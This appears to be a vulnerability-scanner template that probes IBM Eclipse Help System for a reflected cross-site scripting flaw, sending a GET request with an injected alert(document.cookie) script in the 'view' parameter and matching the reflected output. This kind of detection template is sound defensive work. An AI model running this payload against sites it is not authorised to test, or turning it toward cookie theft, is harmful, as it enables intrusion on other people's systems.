id: eclipse-help-system-xss
brief:
    title: IBM Eclipse Help System - Cross-Site Scripting
    by: pikpikcu
    level: high
    about: IBM Eclipse Help System 6.1.0 through 6.1.0.6, 6.1.5 through 6.1.5.3, 7.0 through 7.0.0.2, and 8.0 prior to 8.0.0.1 contains a cross-site scripting vulnerability. An attacker can execute arbitrary ...
    label:
        - ibm
        - xss
        - vuln
    score: CVSS:7.2
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/help/index.jsp?view=%3Cscript%3Ealert(document.cookie)%3C/script%3E'
      signs:
        - "on": status
          status:
            - 200
        - "on": word
          has:
            - <script>alert(document.cookie)</script>
            - file not found
          in: body
          need: all
        - "on": word
          has:
            - text/html
          in: header
          need: all
